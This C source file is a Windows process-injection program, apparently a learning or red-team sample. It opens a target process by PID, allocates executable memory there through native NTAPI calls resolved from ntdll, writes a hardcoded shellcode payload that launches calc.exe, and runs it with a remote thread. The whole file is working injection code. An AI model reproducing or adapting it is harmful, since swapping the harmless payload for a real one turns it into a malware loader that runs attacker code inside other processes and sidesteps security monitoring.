#include "func.h"

HMODULE getModule(LPCWSTR moduleName)
{
	HMODULE hModule = NULL;

	info("trying to get handle to module: %S", moduleName);
	hModule = GetModuleHandleW(moduleName);

	if (hModule == NULL)
	{
		warn("error getting handle to module: %S, error: 0x%lx", moduleName, GetLastError());
		return NULL;
	}
	else
	{
		okay("got module to handle!");
		info("%S: \n\t-> 0x%p\n", moduleName, hModule);
		return hModule;
	}
}


int main(int argc, char* argv[])
{
	/*_____________/initialize variables\_____________*/
	DWORD	 procId		= NULL;
	PVOID	 rBuffer	= 0;
	HMODULE	 hNTDLL		= NULL;
	HANDLE	 hThread	= NULL;
	HANDLE	 hProcess	= NULL;
	NTSTATUS STATUS		= NULL;

	unsigned char payload[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


	SIZE_T payloadSize		= sizeof(payload);
	SIZE_T bytesWritten		= NULL;

	//-- get process id from cli arguments
	if (argc < 2)
	{
		warn("usage: %s <PID>", argv[0]);
		return 0;
	}
	procId = atoi(argv[1]);


	/*______________________/get handle to ntdll\______________________*/
	hNTDLL = getModule(L"NTDLL");


	/*______________________/create structs\______________________*/
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID CID = { (HANDLE)procId, NULL};

	
	/*______________________/function prototypes\______________________*/
	info("populating function prototypes");

	NtOpenProcess ntOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
	NtClose ntClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
	NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");

	okay("finished, beginning injection");


	/*______________________/start injection\______________________*/
	STATUS = ntOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS != STATUS_SUCCESS)
	{
		warn("[NtOpenProcess] failed to get a handle on the process, error: 0x%lx", STATUS);
		goto CLEANUP;
	}
	okay("[NtOpenProcess] got handle to process (%ld)", procId);
	info("hProcess: \n\t-> 0x%p\n", hProcess);

	/*______________________/allocate buffer\______________________*/
	STATUS = ntAllocateVirtualMemory(hProcess, &rBuffer, NULL, &payloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		warn("[NtAllocVirtualMemory] failed to allocate memory, error: 0x%lx", STATUS);
		goto CLEANUP;
	}
	okay("[NtAllocVirtualMemory] allocated %zu-bytes to rBuffer", payloadSize);


	/*______________________/write to buffer\______________________*/
	STATUS = ntWriteVirtualMemory(hProcess, rBuffer, payload, sizeof(payload), &bytesWritten);

	if (STATUS != STATUS_SUCCESS)
	{
		warn("[NtWriteVirtualMemory] could not write to buffer, error: 0x%lx", STATUS);
		goto CLEANUP;
	}
	okay("[NtWriteVirtualMemory] wrote %zu-bytes to rBuffer", bytesWritten);

	/*_______________________/create thread\_______________________*/
	STATUS = ntCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		warn("[NtCreateThreadEx] failed to get a handle on the thread, error 0x%lx", STATUS);
		goto CLEANUP;
	}
	okay("thread created, started routine. waiting for thread to finish execution");

	WaitForSingleObject(hThread, INFINITE);
	okay("finished execution, beginning cleanup");


CLEANUP:

	if (hThread) {
		CloseHandle(hThread);
		info("closing handle to thread");
	}

	if (hProcess) {
		CloseHandle(hProcess);
		info("closing handle to process");
	}

	okay("finished cleanup, exiting");
	return EXIT_SUCCESS;

}